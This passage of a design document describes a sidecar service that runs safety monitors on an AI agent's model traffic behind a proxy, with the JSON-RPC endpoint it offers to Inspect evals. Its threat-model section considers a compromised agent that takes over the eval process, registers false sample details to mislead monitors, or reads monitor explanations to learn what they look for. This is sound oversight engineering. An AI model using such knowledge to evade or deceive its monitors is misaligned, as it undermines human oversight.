**`context.proxy` is what the proxy said about the request.** It holds the provider, the model's name and the user, as the proxy gives them. It also holds, by name, whichever request headers the proxy passed on. Behind Middleman those headers are the labels that Hawk's runner puts on a job (its type, the task, the sample and the epoch), and any others the operator listed, such as Inspect's id for the request. None of this is verified. The caller set the headers, so with a naked agent they came from the agent. That is why `proxy` is a separate field beside `eval` and not part of it. A sentinel that treats a scan differently from an eval, or that picks a rule by the model being watched, reads `context.proxy`. Under Hawk, the kind of job is the `x-hawk-job-type` header there.

**`AfterToolCall.output` is left empty.** Inspect truncates a long tool output before the model is sent it, and only the truncated version is in the model traffic. If the sidecar put the truncated version in `output`, a monitor could read it and believe it was the whole output. Left empty, no monitor makes that mistake. A way to supply the full output can be designed if it turns out to be needed. For an eval whose tools Inspect runs, Inspect has the full output and could send it over the connection described in section 9.

**A person who answers.** In an eval, `human()` waits for whoever is at the terminal. In a sidecar there is usually nobody watching. So the case is written where a reviewer will find it, and the step goes on. Waiting for a person can be added later without changing that default. For an eval, the sidecar would hold the turn, and the eval would pick the question up over the connection described in section 9 and show it in Inspect's approval panel.

**A monitor's model calls in a gated deployment.** Some proxies are gateways: they sign callers in and decide which models each caller may use. Middleman is one. Behind a gateway, a monitor's own model calls belong behind the gateway too. The case that makes this matter is an unreleased model under evaluation. Its output is in every step a monitor reads, so a monitor that asked another lab's model for a judgement would be sending that output to the other lab. Most of what is needed is network and access control that such a deployment already has:

- **The sidecar signs in to the gateway as itself.** It is given the gateway's base URLs, as an eval's runner is. The provider keys stay in the gateway.
- **The gateway's access control decides which monitor models the sidecar can reach.** The sidecar's identity is granted only the models approved for the model under evaluation. That grant is what keeps the model's output inside its lab, and the gateway enforces it.
- **The sidecar's own calls are not handed back to the sidecar to judge.** Otherwise a monitor's model call would come back to the sidecar that made it. The gateway exempts the calls by the sidecar's signed-in identity, and not by a header the sidecar sets.
- **A monitor's model is chosen by the model being watched.** The proxy names the model being watched with each request, so one sidecar can serve models from more than one lab.

None of this is built. Today the sidecar calls a monitor's model directly, with its own key, and a role has one model whatever model is being watched.

## 9. A connection between an eval and its sentinel

When an eval's sentinel runs in a sidecar, the eval and the sentinel are in different processes. The only thing that passes between them is the agent's model traffic. This section adds a direct connection: the sidecar serves an endpoint for evals, and an eval calls it at a URL it is given. The endpoint for evals and its three methods are built. The part of inspect_ai that would call them is not, so today an eval reaches them only if it is written to. `examples/always_sunny` has an Inspect hook that stands in for that part: it registers each sample, asks what was recorded for each model request, and fetches the run's result.

### What the eval tells the sentinel

A sentinel that runs inside an eval is given the sample's details as `context.eval`: the task, the sample, its input and its metadata. These details are not in the model traffic, so a sentinel in a sidecar does not have them unless the eval supplies them. There are three cases.

1. **Registered beforehand.** Before the eval runs, its tasks and samples are registered with the sidecar, with their inputs and metadata. After that they cannot be changed. This case is for secure environments, where the sidecar must accept nothing new while an eval is running. Each model request names its task, sample and epoch in headers, and the sidecar uses those names to look up the registered details.
2. **Sent just in time.** Before a sample's first model call, the eval calls the endpoint for evals and sends the sample's details. This is off unless a deployment turns it on.

   ```
   eval   --->  sidecar :8901                 "sample 7, epoch 2: the input, the metadata"
   agent  --->  proxy  --->  sidecar :8900    the model call; it carries only the names
   ```

   The eval is given one URL for the endpoint for evals, as a setting. The operator decides how that URL reaches the sidecar. It can be the sidecar's own address. It can also be the address of a proxy or load balancer that forwards the endpoint's one path to the sidecar. In either arrangement the agent must not be able to use the endpoint for evals. There are two ways to ensure that: put the endpoint where the agent cannot reach it on the network, or make it require a credential that only the eval holds. If no proxy checks the caller's identity in front of the sidecar, the sidecar checks the credential itself. The endpoint for evals has its own port, separate from the port a proxy sends requests and replies to, so that an operator can control who reaches each one (section 10).
3. **Neither.** The eval supplies nothing, so `context.eval` is None. The sentinel has only what is in the model traffic and what the operator configured. A naked agent is always in this case.

In the first two cases, a monitor receives the same `EvalContext` whether it runs inside the eval or in a sidecar.

### What comes back to the eval

When a sentinel runs inside an eval, the eval gets three things without asking. The sentinel's records appear in the eval's log. The sentinel's state is available to scorers. And a `terminate` is recorded as the end of the sample. A sidecar cannot write into the eval's log or store, so the eval asks the sidecar for these things at the endpoint for evals. This is off unless a deployment turns it on. When it is off, the records stay in the sidecar's own log and a scorer cannot read the sentinel's tally.

- **Records.** After each model reply, the eval asks the sidecar what it recorded for that request, and writes the answer into its transcript at that point. The eval identifies the request by the `x-irid` id it already sends with every model request. The records are ready by then, because the sidecar finishes deciding before it releases a reply. The provider's reply is not changed to carry the records. One condition applies behind Middleman. The sidecar receives `x-irid` only if the operator lists it among the headers `MiddlemanHook` sends, in `INSPECT_SENTINEL_SIDECAR_HEADERS`. Without it the sidecar cannot tell which request the eval is asking about. An eval that cannot learn the `x-irid` of its own requests, as an Inspect hook cannot today, puts an id of its own in another header. The sidecar is then started with `--request-id-header` naming that header, and the operator lists that header for the proxy hook to send. When an eval starts a naked agent, the eval asks once, when the sample ends.
- **Three answers, never two.** When asked about a request, the sidecar gives one of three answers: here is what was recorded; records were held for this request but are no longer kept; or this request was never seen. The eval writes whichever answer it gets into its log. The log then shows a gap where records were lost. Without the distinction, lost records would look like a run in which the sentinel had nothing to say.
- **State.** The sidecar holds a run's tally. Before scoring, the eval fetches it and copies it into the sample's own store, where scorers read it in the usual way. If the eval did not do this, a scorer would find the default values in the store and would read the run as clean, with no error to show that anything was missing.
- **New, or a resume.** The eval tells the sidecar whether a run is new or is being resumed. A new run starts with an empty tally. A resumed run continues with the tally the sidecar remembers. An eval that has gone back to an earlier checkpoint can tell the sidecar which state it has returned to. Going back is rarely used today, so the design allows for it, but it is not among the first things to build.
- **A refusal is asked about, not guessed.** When a sentinel refuses a request, the eval receives an error in the provider's format. That error looks the same as any other failure. So the eval asks the sidecar about the request by its id. The sidecar answers whether a sentinel refused it, and whether the decision was a `reject` or a `terminate`. On a `reject`, the eval sends the request again, and the sidecar adds the rejection to it so that the model is told (section 4). On a `terminate`, Inspect ends the sample the same way it does when the sentinel runs inside the eval: the end is recorded with its reason, and scoring still runs. A marker on the error itself would save the eval this extra call, but it is not required. inspect_ai does not ask yet. Until it does, the sidecar can refuse with a status that a client retries by itself, such as 503 (section 4).

### The methods

The sidecar listens on two ports, one for each kind of caller:

- **Port 8900, for proxies.** A proxy's hook sends each request and each reply here to be judged. This is the endpoint for proxies, at `POST /`.
- **Port 8901, for evals.** This is the endpoint for evals, at `POST /sentinel/v1`.

Both port numbers are defaults. Having two ports lets an operator control who can reach each one: only the proxy needs to reach port 8900, and only evals need to reach port 8901.

The endpoint for evals is on port 8901 and uses JSON-RPC 2.0. JSON-RPC was chosen to be consistent with inspect_ai, which already uses it to talk to the tools it runs in a sandbox and so already has the client code. Every call is a POST to one path, `/sentinel/v1`, and the body names the method. The `v1` in the path is the version of the methods. A JSON Schema file, `src/inspect_sentinel/sidecar/eval_endpoint.schema.json`, describes each method's parameters and result. It is generated from the models in the code, and a test fails if the file is out of date.

A caller presents a token as a bearer credential, in the `Authorization` header. The sidecar reads the token from the `INSPECT_SENTINEL_EVAL_TOKEN` environment variable, and it serves the endpoint for evals only when that variable is set. A call without the right token is answered with HTTP 401. A call that can be read is always answered with HTTP 200, and the body says whether it succeeded, as JSON-RPC defines.

**`register_run`.** Before a sample's first model call, the eval sends the sample's details. These are the same fields a sentinel receives as `context.eval` when it runs inside the eval:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "register_run",
  "params": {
    "run": "smp-4Xk2",
    "resume": false,
    "eval": {
      "task": "philadelphia",
      "task_description": null,
      "sample_id": 1,
      "epoch": 1,
      "sample_description": null,
      "sample_input": "File today's weather report for Philadelphia.",
      "metadata": {"desk": "weather"}
    }
  }
}
```

`run` is the id of the run. The eval chooses it and sends the same id as a header on every model call for the sample (section 7), so the sidecar can match the registration to those calls. Sending the same registration again has no effect, so the eval can safely retry if it gets no answer. Sending a different registration for a run that is already registered is an error. The result says what the sidecar did:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "run": "smp-4Xk2",
    "state": "new"
  }
}
```

`state` is `new` or `resumed`. It is `resumed` when the eval set `resume` and the sidecar still holds state for the run. If the eval set `resume` and the sidecar holds nothing, `state` is `new`, which tells the eval that the earlier state is gone. A sample input that is a list of chat messages is sent in the JSON form inspect_ai writes messages in.

It is an error to register a run as new when the sidecar has already judged steps for it:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32001,
    "message": "Run smp-4Xk2 has already been judged and can't be registered as new."
  }
}
```

**`request_result`.** The eval asks what happened to one model request. It identifies the request by the id it sent with it. The sidecar reads that id from Inspect's `x-irid` header, or from the header that `--request-id-header` names:

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "request_result",
  "params": {"id": "irid-7f3a9c"}
}
```

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "id": "irid-7f3a9c",
    "records": "held",
    "state": "decided",
    "outcome": "reject",
    "message": "It's always sunny in Philadelphia.",
    "recorded": [
      {
        "kind": "record",
        "path": "always_sunny",
        "factory": "always_sunny",
        "name": "always_sunny",
        "call": "toolu_01Q8",
        "report": {
          "action": "reject",
          "explanation": "The report said heavy rain.",
          "message": "It's always sunny in Philadelphia."
        }
      }
    ]
  }
}
```

`outcome` is `continue`, `reject` or `terminate`. It is the field the eval acts on. `message` is the text the model is told. An `explanation` is written to the log only and is never shown to the model. Each record has a `call` field holding the id of the tool call it is about.

A client that retries a request sends it again under the same id. `outcome` and `message` are then for the latest attempt, and `recorded` holds every attempt's records in order. `state` says where the latest attempt stands, so that an eval can tell a request that will have an answer from one that never will:

- `judging`: the sentinel is at work on the request or its reply. Asking again later will give a different answer.
- `awaiting_reply`: the request was sent on, and the proxy has not handed over a reply. Middleman hands over only the replies of calls that succeeded, so a request whose call failed at the provider stays in this state.
- `decided`: `outcome` says what was decided.
- `not_judged`: judging ended without a decision, and `reason` says why. `unreadable` means the request or its reply could not be read. `time_limit` means the sentinel passed a time limit and was cancelled. `error` means the sentinel raised an error. `provider_error` means the provider's reply was an error, so there was nothing to judge.

`outcome` and `message` are present only when `state` is `decided`.

`records` says whether the sidecar has records for the request. It is one of three values: `held` means it has them, and they are in `recorded`; `dropped` means it had them and no longer keeps them; `unknown` means it never saw the request. `dropped` and `unknown` are normal results and not errors, because the eval writes them into its log. With either of them, the result has no `outcome`, `message` or `recorded`.

**`run_result`.** The eval asks once, before scoring:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "run_result",
  "params": {"run": "smp-4Xk2"}
}
```

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "run": "smp-4Xk2",
    "outcome": "continue",
    "store": {
      "Tally:always_sunny:instance": "always_sunny",
      "Tally:always_sunny:rejected": 1
    }
  }
}
```

The eval copies `store` into the sample's own store, where scorers read it. The keys are the ones the sentinel wrote, which name the monitor or protocol that owns each value. `outcome` is `terminate` if a sentinel ended the run. A run the sidecar holds nothing for is an error, with the code `-32002`, so that an eval never mistakes a forgotten run for a clean one.

### A client that can't be trusted

Suppose an agent takes over the process that runs an eval. It then holds the eval's credential and can call the endpoint for evals. It can also run tools directly, without asking a model. No proxy sees those tool runs, and containing them is the sandbox's job. The endpoint for evals cannot prevent that. Its obligation is to give a compromised client no additional power. Four rules follow.

- **No method can loosen a decision.** Every method either sends context in or reads results out. No method allows a call, clears a tally, or changes the sentinel or its configuration. Decisions are made only on the requests and replies a proxy sends. When a sentinel escalates to a person, that person's answer is never accepted on an eval's credential.
- **What an eval registers is a claim, not a fact.** A compromised client could register a sample input or metadata that is false, to mislead a monitor that reads them. Section 8 says that nothing in `context.eval` came from the agent. When details are sent just in time, that is true only if the process that sent them can be trusted. Where it cannot be, samples are registered beforehand, from outside the eval, and the sidecar accepts nothing during a run (the first case above). A registration can be written only once, so it cannot be changed part-way through a run.
- **A credential works only for its own runs.** The sidecar checks that the caller is allowed to register or read the run it names. One eval then cannot read or register another eval's runs. This rule is not built yet: today there is one token, and every caller that holds it can name any run.
- **Results can be withheld.** A record contains each monitor's explanation, and an explanation tells an agent what the monitor looks for. Where the client is not trusted, the two result methods are turned off with `--no-eval-results`, and the records stay in the sidecar. An eval can then still register a sample.

Not yet designed:

- registering all of an eval's samples beforehand, which the first case needs
- whether a sentinel in a sidecar may ever be given the sample's `target`
- how a state is named when an eval has gone back to an earlier one
- how the eval tells the sidecar that a sample has ended
- methods for a question put to a person and for a tool's full output (section 8)
- how a credential is tied to its runs

Considered and not taken:

- **Carrying the records back on the model reply itself**, in a header, an extra field or an extra event in a stream. The records would arrive with the call they belong to, and no second request would be needed. But this changes the provider's reply, and it reaches an eval only when Inspect is the one making the model call.
- **A separate REST-style route for each method.** JSON-RPC was chosen instead for two reasons. inspect_ai already uses it for its sandbox tools and has the client code. And a proxy that forwards the endpoint for evals then has only one path to forward.

## 10. Operations

- **Failing closed is the default.** A turn that could not be judged is refused. A turn cannot be judged when it is unreadable, when a monitor raises an error, or when the sidecar is down or too slow. Failing closed makes the sidecar a hard dependency of every model request, which is what a safety monitor is meant to be. A deployment can choose to let such turns through instead.
- **Throughput comes from more sidecar processes, and not from a faster one.** A Python process uses one core. The nearest measurement is from the earlier Envoy processor, where a Python process was handed steps over gRPC and did nothing but run sentinels. That process managed about 2,200 steps a second with a sentinel that does nothing, and about 1,100 with a sentinel that reads every message (**measured**, Linux, two cores). Those figures are a best case for one part of the work, because in this sidecar the Python process also reads the traffic. No figures are quoted for this sidecar until the whole path has been measured on Linux.
- **For a sentinel that asks a model, the sidecar's own speed decides little.** The model's answer takes hundreds of milliseconds, and the provider's rate limits are reached long before the sidecar's.
- **A run's state is kept in memory today, in one process.** That state is the store of section 8, the rejected turns and the ended runs of section 4, and the registered sample and the records of section 9. A sidecar that runs as several processes needs those processes to share it, and a run that outlasts a restart needs it kept. The plan is to put the handler's state behind one interface, with today's in-memory version as the default. Possible later implementations are one on Valkey and one on S3. The interface is not designed or built.
- **A record log that can't be rewritten**, not yet designed. Records are to leave the sidecar as they are made, to somewhere neither the sidecar nor a client can change them afterwards. What the sidecar keeps is then a copy for the result methods of section 9, and not the record itself.
- **A health check is answered at `GET /health`, on each port the sidecar listens on.** The answer is `ok` with status 200. The route asks for no credential, on the endpoint for evals as well, and it checks nothing. The sidecar loads its sentinel before it listens, so an answer means the sidecar is ready to judge, and a sidecar whose sentinel can't be loaded stops without ever listening. The route is for whatever runs the sidecar to probe, so that a sidecar that has stopped answering is restarted. A proxy does not call it, and it is not part of the messages a proxy and the sidecar exchange. Health checks are left out of the sidecar's access log, which would otherwise gain a line for every probe.
- **Access is the operator's to control.** The port a proxy sends requests and replies to is protected by where the sidecar listens: an operator makes it reachable by the proxy alone, and uses `https` unless the two run side by side. The endpoint for evals is on a port of its own and asks for a credential (section 9). Other forms of authentication, such as a credential on what a proxy sends, may be supported later.
- **What `MiddlemanHook` adds to a model call** is two round trips to the sidecar: one for the request and one for the reply. The time they add has not been measured.

## 11. Testing

- **A replay corpus.** The tests read replies recorded from the live Anthropic and OpenAI APIs, both streamed and not streamed. The cases that must be unreadable are kept beside them.
- **The handler is tested without a proxy.** The endpoint for proxies is tested through its messages and held to its schema file. `MiddlemanHook` is tested against the same file, and against a running sidecar.
- **A conformance suite**, not yet written. It would check that the same monitors and the same steps give the same decisions and records in inspect_ai's host and in the sidecar.
- **The whole chain, live.** An unmodified Inspect task runs through Middleman with the sidecar deciding, on Anthropic and on OpenAI's Chat Completions and Responses APIs. The task is in `examples/always_sunny`.
- **An example stack.** `examples/always_sunny` has a compose file that starts Middleman, the sidecar and a local sign-in service, so the whole chain runs with one command.
- **The endpoint for evals, live.** The `stations` task in `examples/always_sunny` runs an eval that registers each sample and fetches each run's result, through the same stack, on Anthropic and on OpenAI. Its sentinel decides by the sample's metadata, and a scorer reads the sentinel's tally.
- **Middleman's passthrough hook has tests of its own**, in Middleman's test suite.

## Built and not built

| | Built | Not built |
|---|---|---|
| Proxies | Middleman, through `MiddlemanHook` and the endpoint for proxies | a LiteLLM proxy hook; the Envoy shim |
| Providers | Anthropic Messages; OpenAI Chat Completions and Responses | Gemini |
| Stages | `BeforeToolCall`, `AfterToolCall` | `BeforeGenerate`, `AfterGenerate` |
| Decisions | `continue`, `reject`; `terminate`, with the run's later requests refused; `escalate`, where the step goes on | `modify` |
| Runs | keyed by the name the proxy passes on, or by how the conversation opens | tally levels; a check on a naked agent's name for its run |
| Context | `eval` where an eval registered the sample; `proxy`; the store; `generate`; `output` left empty | the default view of a call; registering samples beforehand; a monitor's model calls through the gateway |
| Endpoint for evals | `register_run`, `request_result`, `run_result`, with one token for all callers; `--request-id-header`, for a client that names its requests itself; an example Inspect hook that calls all three | a credential for each run; inspect_ai calling it |
| Delivery | a whole turn held, then passed or refused | keepalives while holding; releasing text early; delivering a decision that takes hours |
| Operations | in-memory state, in one process; a size limit on what is read from a proxy; an optional time limit on a sentinel | an interface for a run's state, with implementations that share it and keep it (possibly Valkey and S3); a lasting record log, streamed out as it is written; the queue of cases for a person to review; limits on a hold for a proxy that does not hold the reply itself |

One difference from section 2: OpenAI replies are validated strictly today. A value that the installed SDK does not know makes the turn unreadable, where the rule in section 2 says the turn should be read.

## Asked of inspect_ai

- **A public function for each provider that turns stream events into a `ModelOutput`.** Each inspect_ai provider has this logic inside it, with its repairs for SDK defects. Making it callable on a stream that is not the provider's own would put the private Anthropic accumulator behind inspect_ai's API, and would cover Gemini.
- **Converters that parse a dict as leniently as the SDK does.**
- **A converter that says so when it meets a block it does not recognise, or a Beta type.** Today the Anthropic converter returns less than it was given, with no error.
- **A public function that writes a message in Anthropic's format**, as there is for OpenAI's format.
- **Headers on each model request that name the task, the sample and the epoch.**
- **A public way to learn the id of the running sample.** The id that names a run on its model calls is held by a private function in inspect_ai, and it is not the uuid in the eval log. An Inspect hook is given it before a model call, but not when the sample starts or before scoring.
- **The id of each model request, given to Inspect hooks.** Without the `x-irid` of a request, an Inspect hook cannot ask the sidecar about that request by it. The Inspect hook in `examples/always_sunny` puts an id of its own on each request in its place. That takes a second header, a sidecar started to read it, and a proxy told to pass it on.
- **Recognising a sentinel's refusal.** On a `reject`, inspect_ai sends the request again. On a `terminate`, it ends the sample.
- **Asking the sidecar for records and state**, and writing them into the transcript and the sample's store.
- **A public way to make the default rendering of a tool call.**
- **A label on a grader's model calls**, so that a proxy can tell them from an agent's calls.

## Proposed for the core package

- **`Context.proxy`**, built on this branch. It holds the provider, the model, the user and the headers the proxy passed on. It is None in an eval's own process. The field is optional, so a host that does not set it is unaffected. The proxy spike left a question open: what does a proxy supply in place of `eval`? `Context.proxy` is the answer proposed here, and the task, the sample and the epoch are in it where the proxy passes those headers on.

## Deferred

- **Running the sentinel as WebAssembly inside the sidecar.** The WASM sidecar spike (`spikes/wasm_sidecar/`, 2026-10-06) ran the unchanged sentinel runner as a WebAssembly component inside a sidecar process. That adds isolation between a monitor and the sidecar, credentials the monitor never holds, and hard limits on its time and memory. It is described in [proxy-host.md](proxy-host.md), section 4. This design is the sidecar that such a component would run inside. Today the sidecar is plain Python and its handler calls the sentinel directly, and nothing here is built for WebAssembly.
